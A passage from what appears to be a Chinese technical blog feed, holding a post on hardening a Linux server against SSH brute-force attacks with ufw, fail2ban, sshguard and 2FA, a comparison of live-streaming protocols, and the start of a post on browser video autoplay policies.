Received disconnect from 196.251.67.42 port 44982:11: Bye Bye [preauth]</span><br><span class="line">Apr  2 15:05:42 cloud sshd[34627]: Disconnected from authenticating user root 196.251.67.42 port 44982 [preauth]</span><br><span class="line">Apr  2 15:15:38 cloud sudo:     root : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/auth.log</span><br><span class="line">Apr  2 15:15:38 cloud sudo: pam_unix(sudo:session): session opened for user root by root(uid=0)</span><br></pre></td></tr></table></figure><blockquote><p>RedHat/CentOS 日志为 <code>/var/log/secure</code></p></blockquote><p>你也可以使用 <code>sudo cat /var/log/auth.log | grep &quot;Failed&quot;</code> 单独过滤出来哪些登录失败的日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apr  2 14:25:16 cloud sshd[34106]: Failed password for invalid user xiaoli from 80.94.95.112 port 10340 ssh2</span><br><span class="line">Apr  2 14:25:19 cloud sshd[34106]: Failed password for invalid user xiaoli from 80.94.95.112 port 10340 ssh2</span><br><span class="line">Apr  2 14:25:22 cloud sshd[34106]: Failed password for invalid user xiaoli from 80.94.95.112 port 10340 ssh2</span><br><span class="line">Apr  2 14:26:50 cloud sshd[34119]: Failed password for root from 92.255.85.188 port 61284 ssh2</span><br><span class="line">Apr  2 14:34:57 cloud sshd[34209]: Failed password for invalid user user from 103.197.184.12 port 15840 ssh2</span><br></pre></td></tr></table></figure><p>如果你开启了防火墙，可以通过防火墙的拦截日志来侧面看出服务器被扫描端口的严重程度。以 ufw 为例：</p><ol><li>使用 <code>ufw logging on</code> 启用实时日志；</li><li>使用 <code>tail -f /var/log/ufw.log</code> 查看 ufw 的日志；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apr  2 15:27:34 cloud kernel: [189619.367923] [UFW BLOCK] IN=ens3 OUT= MAC=32:1c:6e:bf:7a:45:48:a9:8a:a2:7e:fe:08:00 SRC=195.178.110.220 DST=xxx.xxx.xxx.xxx LEN=60 TOS=0x00 PREC=0x00 TTL=48 ID=59696 DF PROTO=TCP SPT=50196 DPT=6000 WINDOW=32120 RES=0x00 SYN URGP=0</span><br></pre></td></tr></table></figure><p>上面这行日志说明，195.178.110.220 正在向 xxx.xxx.xxx.xxx（也就是本机）的 6000 端口上发送 TCP 握手请求，但是被 UFW 拦截了，因为 UFW 未开放此端口。</p><h1 id="2-如何防止服务器被攻击"><a href="#2-如何防止服务器被攻击" class="headerlink" title="2. 如何防止服务器被攻击"></a>2. 如何防止服务器被攻击</h1><h2 id="2-1-开启防火墙"><a href="#2-1-开启防火墙" class="headerlink" title="2.1 开启防火墙"></a>2.1 开启防火墙</h2><p>开启防火墙是重中之重，这里简单讲解一下 <code>netfilter</code>、<code>iptables</code>、<code>nfw</code> 等几个常见的与防火墙相关的工具，以及他们的关系：</p><h3 id="netfilter"><a href="#netfilter" class="headerlink" title="netfilter"></a>netfilter</h3><p><code>netfilter</code> 是 Linux 内核层的一个模块，负责提供网络数据包过滤、NAT 等功能，同时提供了多个挂载点，如 PREROUTING、INPUT、OUTPUT 等（完整的 hook 如下图，左侧绿框代表外部网络，右侧蓝框代表系统内部网络，中间区域即为防护墙）。<code>netfilter</code> 本身不提供数据包的过滤规则，只是系统底层的一个接口，因此我们不会直接使用 <code>netfilter</code> 来管理防火墙规则。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504021130341.png" alt=""></p><h3 id="iptables-与-nftables"><a href="#iptables-与-nftables" class="headerlink" title="iptables 与 nftables"></a>iptables 与 nftables</h3><p><code>iptables</code> 是一个命令行工具，用户可以按照一定的语法编写防火墙规则，<code>iptables</code> 会将这些规则实现在 <code>netfilter</code> 的各个 hook 上，达到数据包丢弃、拦截等防火墙的功能。</p><p><code>iptables</code> 使用 table 来组织规则，根据<strong>用来做什么类型的判断</strong>（the type of decisions they are used to make）标准，将规则分为不同 table。例如，如果规则是处理 网络地址转换的，那会放到 <code>nat</code> table；如果是判断是否允许包继续向前，那可能会放到 <code>filter</code> table。</p><p>一般与防火墙规则相关的会放在 filter table 中，我们可以使用 <code>iptables --table filter --list</code> 列出所有的 filter 表，表中记录就是端口和 ip 的过滤规则，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Chain INPUT (policy DROP)</span><br><span class="line">target prot opt source destination</span><br><span class="line">ACCEPT udp -- 192.168.1.0/24 anywhere multiport dports 1:65535</span><br></pre></td></tr></table></figure><p>这条规则表示允许 <code>192.168.1.0/24</code> 子网内的所有设备使用 <strong>任意 UDP 端口</strong> 访问 <strong>任何目标地址</strong>，没有任何限制。</p><p><code>nftables</code> 可以理解为是 <code>iptables</code> 的继任者，旨在提供更现代化和高效的数据包过滤框架。与 <code>iptables</code> 相比，<code>nftables</code> 引入了更简洁的语法和更强大的功能，支持事务型规则更新和更好的性能。在 Ubuntu 官方日志中 21.10 已经默认使用 <code>nftables</code>，但你可能会发现 <code>iptables</code> 指令仍然可以使用，这是因为 Ubuntu 使用的是 <code>iptable</code> 的 <code>nf_tables</code> 模式，这个模式下允许 <code>iptables</code> 使用 <code>nftables</code> 的 API，属于一种过渡性的方案（实际背后仍然是 <code>nftable</code>，你可以使用 <code>ls -l /usr/sbin/iptables-nft</code> 来验证这一点）。但是比较旧的 Ubuntu 仍运行的是 <code>legacy</code> 模式，你可以使用 <code>iptables -v</code> 来检查当前使用那种模式。</p><h3 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h3><p>虽然 <code>iptables</code>、<code>nftables</code> 已经将 <code>netfilter</code> 封装了一层，但是规则设定仍然很复杂，对于非专业 Linux 运维人员来说，只想简单的设置哪些端口、哪些 IP 需要禁用掉就可以了，怎么书写 <code>iptables</code> 规则什么的根本不想学。<code>ufw</code> 就是一个可以极度简化 <code>iptables</code>、<code>nftables</code> 配置的工具。</p><p>只需要简单的学习如下几个指令即可轻松使用 ufw：</p><ul><li><code>ufw status</code>：查看 ufw 状态、配置了哪些规则；</li><li><code>ufw allow 80</code>：允许 80 端口号开放（tcp 和 udp）；</li><li><code>ufw allow 22/tcp</code>：允许所有的外部IP访问本机的22/tcp (ssh)端口；</li><li><code>ufw allow from 192.168.1.100</code>：允许此IP访问所有的本机端口；</li><li><code>ufw deny smtp</code>：禁止外部访问 smtp 服务；</li><li><code>ufw enable</code>：启用 ufw；</li><li><code>ufw disable</code>：禁用 ufw；</li></ul><p>或者更简单的，可以使用 1Panel 的防火墙管理功能，来可视化的配置 ufw。</p><h2 id="2-2-使用-fail2ban-或-sshguard"><a href="#2-2-使用-fail2ban-或-sshguard" class="headerlink" title="2.2 使用 fail2ban 或 sshguard"></a>2.2 使用 fail2ban 或 sshguard</h2><h3 id="fail2ban"><a href="#fail2ban" class="headerlink" title="fail2ban"></a>fail2ban</h3><p>fail2ban 是一款用于防御服务器被外部攻击的工具，它可以通过读取系统或应用的日志，并根据配置规则，与系统防火墙配合，主动禁止某些 IP 的连接。</p><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install fail2ban</span><br></pre></td></tr></table></figure><p>启用服务并设置守护进程：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start fail2ban</span><br><span class="line">systemctl <span class="built_in">enable</span> fail2ban</span><br></pre></td></tr></table></figure><p>一般情况下这样就可以了，对于 ssh、mysql、nginx 这种常见的应用 fail2ban 已经配置好了响应的应用规则，如果 fail2ban 发现了日志中的异常，比如 ssh 在 60 秒内登录失败了 3 次，那么就会将这个 IP 写入到 iptables 的规则，知道 600 秒后再解除禁用。你可以使用 <code>sudo iptables -L -n | grep f2b</code> 来过滤出 fail2ban 创建的规则表，并找到哪些 IP 被禁用。</p><p>如果你希望修改配置规则，比如将封禁的 IP 永久拉黑，或者将规则写到 ufw 中而不是直接写到 iptables 中，你可以创建一个 <code>/etc/fail2ban/jail.local</code> 文件并写入如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">bantime = -1</span><br><span class="line">findtime = 60</span><br><span class="line">maxretry = 3</span><br><span class="line">banaction = ufw</span><br></pre></td></tr></table></figure><p>使用 <code>systemctl restart fail2ban</code> 即可重新生效。</p><p>上面的自定义配置代表如果在 60 秒内尝试失败 3 次，那么该 IP 的禁用时间就设置为 <code>-1</code> 表示永久禁封，<code>banaction</code> 代表封禁行为，ufw 表示使用 ufw 规则进行封禁，如果出现 IP 被封禁，我们可以使用 <code>ufw status</code> 就可以看到这些 IP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To                         Action      From</span><br><span class="line">--                         ------      ----</span><br><span class="line">Anywhere                   REJECT      118.122.147.8             </span><br><span class="line">Anywhere                   REJECT      14.103.121.78             </span><br><span class="line">Anywhere                   REJECT      120.157.38.255            </span><br><span class="line">Anywhere                   REJECT      80.94.95.112              </span><br><span class="line">Anywhere                   REJECT      196.251.67.42  </span><br></pre></td></tr></table></figure><p>你也可以使用 fail2ban 的命令行指令来查看 fail2ban 的状态：</p><ul><li><code>fail2ban-client status</code>：查看 fail2ban 正在管理哪些应用；</li><li><code>fail2ban-client status sshd</code>：查看 ssh 的封禁状态；</li></ul><h3 id="sshguard"><a href="#sshguard" class="headerlink" title="sshguard"></a>sshguard</h3><p>sshguard 是一个更为轻量的、专门用于防止 ssh 密码暴力破解攻击的工具，如果你觉得 fail2ban 有很多功能不需要，可以尝试使用 sshguard。</p><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install sshguard</span><br></pre></td></tr></table></figure><p>启用服务并设置守护进程：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start sshguard</span><br><span class="line">systemctl <span class="built_in">enable</span> sshguard</span><br></pre></td></tr></table></figure><p>在 <code>/etc/ufw/before.rules</code> 中写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># allow all on loopback</span><br><span class="line">-A ufw-before-input -i lo -j ACCEPT</span><br><span class="line">-A ufw-before-output -o lo -j ACCEPT</span><br><span class="line"></span><br><span class="line"># hand off control for sshd to sshguard</span><br><span class="line">:sshguard - [0:0]</span><br><span class="line">-A ufw-before-input -p tcp --dport 22 -j sshguard</span><br></pre></td></tr></table></figure><p>sshguard 的原理也是读取 ssh 的登录日志，然后为每个登录行为进行打分，如果分数达到一定阈值就会禁用这个 IP 的 ssh 连接请求，并且禁用时长会随着再次失败的尝试次数而逐渐递增。</p><p>你可以使用 <code>cat /var/log/auth.log | grep sshguard</code> 来查看 sshguard 的拦截记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apr  1 16:03:39 cloud sshguard[2897]: Attack from &quot;160.191.52.73&quot; on service 100 with danger 10.</span><br><span class="line">Apr  1 16:03:39 cloud sshguard[2897]: Attack from &quot;160.191.52.73&quot; on service 110 with danger 10.</span><br><span class="line">Apr  1 16:03:40 cloud sshguard[2897]: Attack from &quot;160.191.52.73&quot; on service 110 with danger 10.</span><br><span class="line">Apr  1 16:03:40 cloud sshguard[2897]: Blocking &quot;160.191.52.73/32&quot; for 120 secs (3 attacks in 1 secs, after 1 abuses over 1 secs.)</span><br></pre></td></tr></table></figure><h1 id="4-其他手段"><a href="#4-其他手段" class="headerlink" title="4. 其他手段"></a>4. 其他手段</h1><p>除了防火墙和登录次数限制之外，还可以使用二步认证（2FA）来要求登录者在登录的时候输入动态 Token，采取了这个手段之后能够进一步避免密码泄露的风险。</p><p>以 Ubuntu 系统为例，首先安装 Google 的验证器插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libpam-google-authenticator</span><br></pre></td></tr></table></figure><p>然后命令行输入 <code>google-authenticator</code> 初始化验证器，然后依次选择：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Do you want authentication tokens to be time-based (y/n) y</span><br><span class="line"></span><br><span class="line">Do you want me to update your &quot;~/.google_authenticator&quot; file (y/n) y</span><br><span class="line"></span><br><span class="line">Do you want to disallow multiple uses of the same authentication</span><br><span class="line">token? This restricts you to one login about every 30s, but it increases</span><br><span class="line">your chances to notice or even prevent man-in-the-middle attacks (y/n) y</span><br><span class="line"></span><br><span class="line">By default, a new token is generated every 30 seconds by the mobile app.</span><br><span class="line">In order to compensate for possible time-skew between the client and the server,</span><br><span class="line">we allow an extra token before and after the current time. This allows for a</span><br><span class="line">time skew of up to 30 seconds between the authentication server and client. Suppose you</span><br><span class="line">experience problems with poor time synchronization. In that case, you can increase the window</span><br><span class="line">from its default size of 3 permitted codes (one previous code, the current</span><br><span class="line">code, the next code) to 17 permitted codes (the eight previous codes, the current</span><br><span class="line">code, and the eight next codes). This will permit a time skew of up to 4 minutes</span><br><span class="line">between client and server.</span><br><span class="line">Do you want to do so? (y/n) n</span><br><span class="line"></span><br><span class="line">If the computer that you are logging into isn&#x27;t hardened against brute-force</span><br><span class="line">login attempts, you can enable rate-limiting for the authentication module.</span><br><span class="line">By default, this limits attackers to no more than three login attempts every 30s.</span><br><span class="line">Do you want to enable rate-limiting (y/n) y</span><br></pre></td></tr></table></figure><p>然后命令行中会出现一个如下图的二维码，手机安装 Google Authenticator 应用后点击添加按钮并扫描这个二维码：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202504141054898.png" alt="image.png|459"></p><p>然后需要配置 OpenSSH 以使用 2FA/PAM。首先编辑 <code>/etc/pam.d/sshd</code> 配置，然后再文件尾部添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">. . .</span><br><span class="line"># Standard Un*x password updating.</span><br><span class="line">@include common-password</span><br><span class="line">auth required pam_google_authenticator.so nullok</span><br><span class="line">auth required pam_permit.so</span><br></pre></td></tr></table></figure><p>最后一行末尾的 <code>nullok</code> 表示这个身份验证方法是可选的。这允许没有 OATH-TOTP 令牌的用户依然可以仅使用他们的 SSH 密钥登录。一旦所有用户都配置了 OATH-TOTP 令牌，你可以移除这一行中的 <code>nullok</code>，从而强制启用多因素认证（MFA）。</p><p>第二行中的 <code>pam_permit.so</code> 是必须的，它用于允许那些没有使用 MFA 令牌的用户继续进行身份验证。</p><p>在登录时，每种认证方法都需要返回 <code>SUCCESS</code> 才能通过认证。如果用户没有使用 MFA 工具，使用 <code>nullok</code> 选项会使交互式键盘认证返回 <code>IGNORE</code>。这时，<code>pam_permit.so</code> 会返回 <code>SUCCESS</code>，从而允许认证继续进行。</p><p>接下来，我们将配置SSH以支持这种身份验证，编辑 <code>/etc/ssh/sshd_config</code> 文件，将 <code>ChallengeResponseAuthentication</code> 修改为 <code>yes</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Change to yes to enable challenge-response passwords (beware issues with</span><br><span class="line"># some PAM modules and threads)</span><br><span class="line">ChallengeResponseAuthentication yes  </span><br><span class="line">AuthenticationMethods publickey,password publickey,keyboard-interactive</span><br></pre></td></tr></table></figure><blockquote><p>在高版本的 SSH 中，可能没有上面两个配置项，那么只需要将 <code>KbdInteractiveAuthentication</code> 设置为 <code>true</code> 即可。</p></blockquote><p>保存并关闭文件后，使用 <code>systemctl restart sshd.service</code> 可以重启 ssh 服务以生效。使用重启指令后并不会使当前的用户会话退出，此时可以另外开启一个会话，测试一下 2FA 是否可以使用，确保没有问题后就可以退出会话了。</p><h1 id="3-引用参考"><a href="#3-引用参考" class="headerlink" title="3. 引用参考"></a>3. 引用参考</h1><ul><li><a href="https://arthurchiao.art/blog/deep-dive-into-iptables-and-netfilter-arch-zh/">https://arthurchiao.art/blog/deep-dive-into-iptables-and-netfilter-arch-zh/</a></li><li><a href="https://zhuanlan.zhihu.com/p/33546122">https://zhuanlan.zhihu.com/p/33546122</a></li><li><a href="https://www.51cto.com/article/707312.html">https://www.51cto.com/article/707312.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用在线直播协议的对比与介绍</title>
      <link href="/2025/03/86472799492a.html"/>
      <url>/2025/03/86472799492a.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1Xc411T79K/?spm_id_from=333.337.search-card.all.click&vd_source=b233b2041b0c7ce85a2c9111063e461f">参考视频</a></p><h1 id="1-初识"><a href="#1-初识" class="headerlink" title="1. 初识"></a>1. 初识</h1><p>在线直播分为推流和拉流两个基础概念：</p><ul><li>推流是指用户使用手机、摄像机、监控等设备将视频实时推送到服务端，常见的协议有 RTMP、RTSP；</li><li>拉流则是指当用户访问直播平台后，从应用内拉取服务器上的视频流并播放，常见的拉流协议有 HLS、HTTP-FLV 等。</li></ul><h1 id="2-RTMP-Real-Time-Messaging-Protocol"><a href="#2-RTMP-Real-Time-Messaging-Protocol" class="headerlink" title="2. RTMP (Real-Time Messaging Protocol)"></a>2. RTMP (Real-Time Messaging Protocol)</h1><p>RTMP 协议是一种通信技术，最早是为 Flash Player 开发的，其协议可以应用于推流也可以用于拉流。其推流和拉流访问的地址都是一样的，比如 <code>rtmp://0.0.0.0:1234/live</code>。但是 RTMP 协议在浏览器端的拉流以及播放都依赖 Flash，由于 Flash 已经被淘汰了，并且据说存在一些并发的稳定性问题，所以目前不太常用作于浏览器的拉流方案。因此，RTMP 通常只用作于直播源推流、推流到直播 CDN 等场景。</p><p>对于直播的延迟来说，RTMP 延迟较低，通常在 1~3 秒。RTMP 通信是建立在 TCP 长连接通道上的，封装音视频数据时会强制切片，有一定的弱网抵抗能力，但是服务端合并数据包会带来一定的性能压力。</p><h1 id="3-HTTP-FLV"><a href="#3-HTTP-FLV" class="headerlink" title="3. HTTP-FLV"></a>3. HTTP-FLV</h1><p>HTTP-FLV 是一个拉流的专用协议，可以简单的理解为是 RTMP 拉流的 HTTP 版本。前面我们说了，RTMP 协议需要依赖 Flash 进行拉流和播放，HTTP-FLV 将 <code>rtmp</code> 协议转为了 <code>http</code> 协议，让协议更具有通用型。但是视频格式仍然为 <code>flv</code>，因此想要在浏览器中播放的话，需要借助 <a href="https://github.com/bilibili/flv.js">flv.js</a> 等插件来完成。</p><p>使用 HTTP-FLV 直播方案的应用会与服务端建立一个长连接，服务端不断将视频的数据流推送给客户端：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202502252013190.png" alt=""></p><p>RTPM 作为推流协议，HTTP-FLV 作为拉流协议是目前比较常见的前端直播方案，能够兼顾通用和低延迟的特性。</p><h1 id="4-HLS-HTTP-Live-Streaming"><a href="#4-HLS-HTTP-Live-Streaming" class="headerlink" title="4. HLS (HTTP Live Streaming)"></a>4. HLS (HTTP Live Streaming)</h1><p>HLS 协议是由苹果推出的协议，与其类似的还有 MPEG-DASH 协议这种国际标准。严格来说并不是专门的直播协议，而是一种更为通用的流媒体协议。</p><p>其原理很简单：客户端发起一个 HTTP 请求来获取一个索引文件，这个索引文件可以理解为一个播放列表，其格式为 <code>.m3u8</code>。文件中记录了一个个视频片段的地址以及时间信息，视频片段通常为一个个的 <code>.ts</code> 文件。客户端只需要不断的一边拉取这个播放列表，一边下载 ts 文件并播放，就实现了直播。如果需要再浏览器端播放，可以使用 <a href="https://github.com/video-dev/hls.js">hls.js</a> 来实现。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202502251742351.png" alt="图源：https://www.bilibili.com/video/BV1Xc411T79K/?spm_id_from=333.337.search-card.all.click&amp;vd_source=b233b2041b0c7ce85a2c9111063e461f"></p><p>使用 HLS 协议的直播特征为，客户端先发起一个 m3u8 请求后，就会根据播放列表不断拉取视频片段（下图是 B 站 HLS 协议直播的请求截图，其选择的视频片段格式为 <code>.m4s</code> 并非 <code>.ts</code>）：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202502252016035.png" alt=""></p><p>HLS 协议有以下优点：</p><ul><li>使用该协议服务端不需要特殊的流媒体服务软件，使用 Nginx 等 HTTP 服务就可以了；</li><li>苹果生态原生支持 HLS 协议，Safari 的 video 链接可以直接为 m3u8 地址；</li><li>基于其实现原理很容易实现视频点播、直播录播等场景，m3u8 文件列出所有的视频片段即可；</li><li>HLS 的视频片段资源是基于静态存储的，所以负载均衡、CDN 加速效果更加明显；</li><li>基于 HLS 实现的视频点播场景通常比 <code>.mp4</code> 等普通的视频文件更快的播放，并且视频的跳转更加流畅；</li><li>m3u8 文件很灵活，支持自定义字段，也支持一个 m3u8 文件中同时定义标清、高清、超清等视频源；</li></ul><p>HLS 最大的缺点就是在视频直播中不占优势，由于视频的存储、切片等行为，HLS 协议的延迟通常在 5~30s，也可能会有 1 分钟的延迟。</p><p>常见的推流到拉流的直播实现方案：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202502251752789.png" alt=""></p><p>使用 <code>ffmpeg</code> 根据 m3u8 文件下载一个完整的视频：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -protocol_whitelist file,http,https,tcp,tls -i xxx.m3u8 -c copy output.mp4</span><br></pre></td></tr></table></figure><h1 id="WebRTC"><a href="#WebRTC" class="headerlink" title="WebRTC"></a>WebRTC</h1><p>WebRTC 是一种点对点的视频/语音通话协议，因此也可以用于直播。因为 WebRTC 是基于 UDP 的，建立通信后会以流式发送数据，因此协议比 RTMP 还要低。在一些直播延迟要求较高的场景中，会使用 WebRTC 作为推流和观看协议，理论延迟可以达到 1s 以内。</p><h1 id="RTSP"><a href="#RTSP" class="headerlink" title="RTSP"></a>RTSP</h1><p>RTSP 一般不用做直播，现代浏览器不兼容。一般用作摄像头、监控等硬件设备的实时视频观看与推送上。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 技术调研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML5 </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 播放器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整理浏览器的自动播放策略</title>
      <link href="/2025/03/d7e879038666.html"/>
      <url>/2025/03/d7e879038666.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-Chrome-浏览器的自动播放策略"><a href="#1-Chrome-浏览器的自动播放策略" class="headerlink" title="1. Chrome 浏览器的自动播放策略"></a>1. Chrome 浏览器的自动播放策略</h1><blockquote><p>我们将 Chrome 的自动播放策略视为标准策略，与其有出入的我们在文章中会重点提示。</p></blockquote><p>Chrome 66 之后的版本中，只有静音的自动播放是被允许的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">vide</span> <span class="attr">src</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">muted</span> <span class="attr">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="name">vide</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此外出现以下几种情况时，有声的自动播放是被允许的：</p><p>当用户与页面有交互后，可以调用 <code>video.play()</code> 方法来播放视频。或者在交互函数中创建的视频元素，此时创建的视频允许有声自动播放，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onButtonClick</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> testContainer = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#test-container&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;video&quot;</span>);</span><br><span class="line">video.<span class="property">id</span> = <span class="string">&quot;test-video&quot;</span>;</span><br><span class="line">video.<span class="property">src</span> = <span class="string">&quot;https://b2b-web-vr.cdn.bcebos.com/aichuman/test3/cd0c8a3435c025410a9f0f15b64bce8b.mp4&quot;</span>;</span><br><span class="line">video.<span class="property">autoplay</span> = <span class="literal">true</span>;</span><br><span class="line">video.<span class="property">controls</span> = <span class="literal">true</span>;</span><br><span class="line">testContainer.<span class="title function_">appendChild</span>(video);</span><br><span class="line">video.<span class="title function_">play</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当网站的“媒体互动指数”超过了阈值，这通常表示用户之前在该网站上曾播放过有声视频，这时视频的有声自动播放是被允许的。</p><p>用户在移动设备上用户将网站添加到主屏幕，或者在桌面上安装了 PWA。</p><h1 id="2-微信内置浏览器中自动播放"><a href="#2-微信内置浏览器中自动播放" class="headerlink" title="2. 微信内置浏览器中自动播放"></a>2. 微信内置浏览器中自动播放</h1><p>在 IOS 微信的内置浏览器中，视频即使是静音状态也无法自动播放，甚至连视频的 <code>loadedmetadata</code> 事件也不会自动触发（在普通浏览器中视频加载出之后即使没有自动播放，<code>loadedmetadata</code> 事件也应该会触发），这就会导致一些视频库，如 YYEVA 的执行失败。</p><p>解决方案：使用 <code>WeixinJSBridgeReady</code> 的回调。</p><p>在微信内置浏览器中，<code>WeixinJSBridgeReady</code> 表示微信提供的 JS bridge 加载完成，在其回调中创建的视频是允许自动播放的，或者直接在其回调中调用视频的 <code>play()</code> 方法也是被允许的，同时这时<strong>视频即使没有设置静音播放也能成功自动播放</strong>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> container = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#test-container&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> video = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;video&quot;</span>);</span><br><span class="line">video.<span class="property">src</span> = <span class="string">&quot;https://b2b-web-vr.cdn.bcebos.com/aichuman/test3/cd0c8a3435c025410a9f0f15b64bce8b.mp4&quot;</span>;</span><br><span class="line">video.<span class="property">autoplay</span> = <span class="literal">true</span>;</span><br><span class="line">video.<span class="property">controls</span> = <span class="literal">true</span>;</span><br><span class="line">video.<span class="property">playsinline</span> = <span class="literal">true</span></span><br><span class="line"><span class="comment">// video.muted = true; // 即使视频不设置静音太</span></span><br><span class="line"></span><br><span class="line">container.<span class="title function_">appendChild</span>(video);</span><br><span class="line"></span><br><span class="line">video.<span class="title function_">addEventListener</span>(<span class="string">&quot;loadedmetadata&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line"><span class="string">&quot;The duration and dimensions of the media and tracks are now known.&quot;</span>,</span><br><span class="line">);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doPlay</span>(<span 